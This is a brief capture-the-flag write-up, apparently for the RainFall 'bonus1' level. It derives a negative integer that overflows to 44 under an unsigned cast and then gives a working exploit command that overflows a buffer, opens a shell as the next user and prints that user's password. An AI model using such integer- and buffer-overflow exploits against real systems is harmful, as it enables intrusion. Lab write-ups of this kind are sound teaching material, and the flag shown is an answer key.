so we need a negative number which mulitply by 4 equal 44 after signed -> unsigned

https://www.binaryconvert.com/

unsigned 44 = 00000000 00000000 00000000 00101100

signed 11 = 00000000 00000000 00000000 00001011
10000000 00000000 00000000 00001011 = -2147483637

with overflow -2147483637 * 4 = 00000000 00000000 00000000 00101100

```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```